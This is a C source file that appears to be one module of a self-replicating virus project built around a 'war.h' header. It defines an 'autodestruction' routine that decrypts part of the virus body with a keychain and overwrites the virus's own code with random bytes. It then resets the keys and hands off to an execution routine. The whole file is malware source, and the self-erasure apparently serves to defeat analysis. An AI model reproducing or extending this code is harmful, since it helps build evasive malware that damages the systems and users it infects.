#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	decrypt_left(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);

	char *entry;
	const size_t size = (void *)autodestruction - (void *)war;
	char buf[size];

	entry = (char *)war;

	if (_getrandom(buf, size, GRND_NONBLOCK) < 0)
		_bzero(buf, size);

	for (register size_t index = 0; index < size; index++)
		entry[index] = buf[index];

	keychain->key[LEFT] = 0xdead;
	keychain->key[RIGHT] = 0xbeef;

	execution(host, keychain, context);
}
